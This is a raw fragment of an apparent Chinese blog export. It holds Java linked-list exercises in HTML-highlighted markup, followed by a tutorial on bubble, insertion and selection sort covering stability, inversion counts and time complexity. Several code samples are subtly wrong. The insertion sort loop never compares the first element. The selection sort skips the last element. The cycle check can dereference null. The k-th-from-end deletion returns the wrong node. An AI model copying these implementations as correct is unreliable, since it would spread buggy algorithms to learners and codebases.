class=\"line\">        n5.next = n6;</span><br><span class=\"line\">        n6.next = n7;</span><br><span class=\"line\">        System.out.println(printLinkList(n4)); <span class=\"comment\">// 4-&gt;5-&gt;6-&gt;7</span></span><br><span class=\"line\">        Node&lt;Integer&gt; head = reverse(n4);</span><br><span class=\"line\">        System.out.println(printLinkList(head)); <span class=\"comment\">// 7-&gt;6-&gt;5-&gt;4</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 求链表的中间节点</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"求链表的中间节点\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n8 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">8</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n9 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">9</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n10 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">10</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n11 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">11</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n12 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">12</span>);</span><br><span class=\"line\">        n8.next = n9;</span><br><span class=\"line\">        n9.next = n10;</span><br><span class=\"line\">        n10.next = n11;</span><br><span class=\"line\">        n11.next = n12; <span class=\"comment\">// 8-&gt;9-&gt;10-&gt;11-&gt;12</span></span><br><span class=\"line\">        System.out.println(printLinkList(n8));</span><br><span class=\"line\">        Node&lt;Integer&gt; mid = middle(n8);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"中间节点是： \"</span> + mid.val);  <span class=\"comment\">// 10</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 有序链表合并</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"有序链表合并\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n13 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">13</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n14 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">14</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n15 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">15</span>);</span><br><span class=\"line\">        n13.next = n14;</span><br><span class=\"line\">        n14.next = n15;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"第一个链表： \"</span>+printLinkList(n8));</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"第二个链表： \"</span>+printLinkList(n13));</span><br><span class=\"line\">        head = merge(n8, n13);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"合并后的链表： \"</span>+printLinkList(head));</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 删除倒数第2个节点</span></span><br><span class=\"line\">        Node&lt;Integer&gt; n16 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">16</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n17 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">17</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n18 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">18</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n19 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">19</span>);</span><br><span class=\"line\">        n16.next = n17;</span><br><span class=\"line\">        n17.next = n18;</span><br><span class=\"line\">        n18.next = n19;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"删除前： \"</span>+printLinkList(n16));</span><br><span class=\"line\">        head = deleteLastKDesc(n16, <span class=\"number\">3</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"删除后： \"</span>+printLinkList(n16));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 合并两个有序链表 */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">merge</span><span class=\"params\">(Node&lt;Integer&gt; n1, Node&lt;Integer&gt; n2)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 确定新链表头结点</span></span><br><span class=\"line\">        Node&lt;Integer&gt; head, p = n1, q = n2;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.val &gt; q.val)&#123;</span><br><span class=\"line\">            head = n2;</span><br><span class=\"line\">            q = q.next;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            head = n1;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;Integer&gt; r = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p!=<span class=\"keyword\">null</span> &amp;&amp;q!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p.val &lt; q.val)&#123;</span><br><span class=\"line\">                r.next = p;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                r.next = q;</span><br><span class=\"line\">                q = q.next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            r = r.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r.next = p;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            r.next = q;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**查找链表中间节点*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">middle</span><span class=\"params\">(Node&lt;Integer&gt; head)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head==<span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\">        Node&lt;Integer&gt; q = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q.next !=<span class=\"keyword\">null</span> &amp;&amp; q.next.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            q = q.next.next;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 链表中环的检测*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isLoop</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 采用快慢指针法 如果两个指针相遇，则说明有环</span></span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\">        Node&lt;Integer&gt; q = head.next.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            q = q.next.next;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (q == p)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/**反转链表*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">reverse</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)<span class=\"keyword\">return</span> head;</span><br><span class=\"line\">        Node&lt;Integer&gt; p;</span><br><span class=\"line\">        Node&lt;Integer&gt; q;</span><br><span class=\"line\">        Node&lt;Integer&gt; r;</span><br><span class=\"line\">        p = head;</span><br><span class=\"line\">        q = p.next;</span><br><span class=\"line\">        p.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r = q.next;</span><br><span class=\"line\">            q.next = p;</span><br><span class=\"line\">            p = q;</span><br><span class=\"line\">            q = r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**删除链表倒数第K个结点*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">deleteLastKDesc</span><span class=\"params\">(Node&lt;Integer&gt; head, <span class=\"keyword\">int</span> k)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head == <span class=\"keyword\">null</span> || k &lt;<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            k--;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            p = head;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (++k != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            p.next = p.next.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Node</span>&lt;<span class=\"title\">E</span>&gt; </span>&#123;</span><br><span class=\"line\">        E val;</span><br><span class=\"line\">        Node&lt;E&gt; next;</span><br><span class=\"line\">        Node(E e)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.val = e;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title\">printLinkList</span><span class=\"params\">(Node&lt;Integer&gt; head)</span></span>&#123;</span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"[\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (head !=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (head.next !=<span class=\"keyword\">null</span>)</span><br><span class=\"line\">                sb.append(head.val).append(<span class=\"string\">\", \"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                sb.append(head.val);</span><br><span class=\"line\">            head = head.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"]\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n"},{"title":"算法-排序(上)","date":"2018-09-20T10:35:29.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。\n\n排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。\n\n|   |排序算法|时间复杂度|是否基于比较|\n|---|-----------|----------|------|\n|上|冒泡、插入、选择|$ O(n^2) $| √ |\n|中|快排、归并     |$ O(nlogN) $| √ |\n|下|桶、计数、基数  |$ O(n) $| × |\n\n带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：<font color=\"red\">**插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？**</font>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何分析一个排序算法\n{% endnote %}\n</div>\n\n学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。**那么要分析一个排序算法，要从哪几方面入手呢？**\n\n#### 一、 算法的执行效率\n\n对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量：\n\n**1、最好情况、最坏情况、平均情况时间复杂度**\n\n我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。\n\n为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。\n\n**2、时间复杂度的系数、常数、低阶**\n\n我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。\n\n**3、比较次数和交换次数**\n\n这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。\n\n#### 二、 算法的内存消耗\n\n前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，**原地排序**。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。\n\n#### 三、 排序算法的稳定性\n\n仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，**稳定性**。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。\n\n我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。\n\n这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做**稳定的排序算法**；如果前后顺序发生变化，那对应的排序算法就叫做**不稳定的排序算法**。\n\n你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？\n\n很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。\n\n比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？\n\n最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。\n\n但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？\n\n**稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变**。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 冒泡排序\n{% endnote %}\n</div>\n\n我们从冒泡排序开始，学习今天的三种排序算法。\n\n冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。\n\n我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样：\n\n{% asset_img 冒泡排序第一次过程.png %}\n\n可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。\n\n{% asset_img 冒泡排序过程.jpg %}\n\n实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。\n\n| 冒泡次数 | 冒泡结果 | 是否有数据交换|\n|---------|---------|--------------|\n| 初始状态 |3，5，4，1，2，6|    -       |\n|第一次冒泡|3，4，1，2，5，6|     有     |\n|第二次冒泡|3，1，2，4，5，6|     有     |\n|第三次冒泡|1，2，3，4，5，6|     有     |\n|第四次冒泡|1，2，3，4，5，6|  无，结束排序操作|     \n\n冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。\n\n```java\n// 冒泡排序 a表示需要排序的数组 n表示数组的大小\npublic void bubbleSort(int[] a,int n){\n    for(int i=0;i<n-1;i++){\n        boolean flag = false;\n        for(int j=0;j<n-1-i;j++){\n            if(a[j]>a[j+1]){\n                int temp = a[j];\n                a[j] = a[j+1];\n                a[j+1] = temp;\n                flag = true;\n            }\n        }\n        if(!flag) break;\n    }\n}\n```\n\n现在结合上面分析算法的三个方面，有三个问题要问你。\n\n**第一、冒泡排序是原地排序算法吗？**\n\n冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。\n\n**第二、冒泡排序是稳定的排序算法吗？**\n\n在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。\n\n**第三、冒泡排序的时间复杂度是多少？**\n\n最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。\n\n最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。\n\n对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过**有序度**和**逆序度**这两个概念来分析。\n\n有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] <= a[j], 如果i < j$。\n\n2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6)\n\n同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n\\*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做**满有序度**。\n\n逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] > a[j], 如果i < j$。\n\n关于这三个概念，我们可以得到一个公式：**逆序度 = 满有序度 - 有序度**。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。\n\n我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15.\n\n| 冒泡次数 | 冒泡结果 | 有序度|\n|---------|---------|--------------| \n| 初始状态 |4，5，6，3，2，1 |  3  |\n|第一次冒泡|4，5，3，2，1，6 |  6  |\n|第二次冒泡|4，3，2，1，5，6 |  9  |\n|第三次冒泡|3，2，1，4，5，6 | 12  |\n|第四次冒泡|2，1，3，4，5，6 | 14  |\n|第五次冒泡|1，2，3，4，5，6 | 15  |\n\n冒泡排序包含两个原子操作，**比较**和**交换**。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为**逆序度，也就是n\\*(n-1)/2 - 初始有序度**。此例中就是15-3=12，也就是要进行12次交换操作。\n\n对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n\\*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n\\*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。\n\n换句话说，平均情况下需要n\\*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。\n\n这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 插入排序\n{% endnote %}\n</div>\n\n我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。\n\n这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。\n\n那插入排序是如何借助上面的思想来实现排序的呢？\n\n首先，我们将数组中的数据分为两个区间，**已排序区间**和**未排序区间**。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。\n\n如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。\n\n{% asset_img 插入排序过程.jpg %}\n\n插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。\n\n对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。\n\n为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n\\*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。\n\n{% asset_img 插入排序移动次数.jpg %}\n\n插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序：\n\n```java\npublic void insertSort(int[] a, int n){\n\tif(n<=1) return;\n\tfor(int i=1;i<n;i++){\n\t\tint val = a[i];\n\t\tint j=i-1;\n\t\tfor(;j>0;j--){\n\t\t\tif(a[j]>val){\n\t\t\t\ta[j+1] = a[j];\n\t\t\t}else {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\ta[j+1] = val;\n\t}\n}\n```\n\n现在同样有三个问题。\n\n**第一、插入排序是原地排序算法吗？**\n\n从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。\n\n**第二、插入排序是稳定的排序算法吗？**\n\n在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。\n\n**第三、插入排序的时间复杂度是多少？**\n\n如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是**从尾到头遍历已经有序的数据**。\n\n如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。\n\n还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 选择排序\n{% endnote %}\n</div>\n\n选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。\n\n{% asset_img 选择排序过程.jpg %}\n\n同样，也有三个问题需要你思考。\n\n**第一、插入排序是原地排序算法吗？**\n\n首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。\n\n**第二、插入排序的时间复杂度是多少？**\n\n选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。\n\n**第三、插入排序是稳定的排序算法吗？**\n\n答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。\n\n比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。\n\n```java\npublic void selectSort(int[] a, int n){\n    for(int i=0;i<n-1;i++){\n        for(int j=i+1; j<n-1;j++){\n        \tif(a[j]<a[i]){\n        \t\tint temp = a[j];\n        \t\ta[j] = a[i];\n        \t\ta[i] = temp;\n        \t}\n        }\n    }\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？\n\n我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。\n\n但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作：\n\n```java\n// 冒泡排序中的数据交换操作\n if(a[j]>a[j+1]){\n    int temp = a[j];\n    a[j] = a[j+1];\n    a[j+1] = temp;\n    flag = true;\n}\n\n// 插入排序中数据移动操作\nif(a[j]<val){\n    a[j+1] = a[j];\n}else {\n    break;\n}\n```\n\n我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。\n\n所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。\n\n|排序算法 | 是否原地排序| 是否稳定|   最好    |   最坏  |   平均  |\n|--------|------------|--------|-----------|---------|---------|\n|冒泡排序 |    √       |  √     | $O(n)$  | $O(n^2)$ |$O(n^2)$|\n|插入排序 |    √   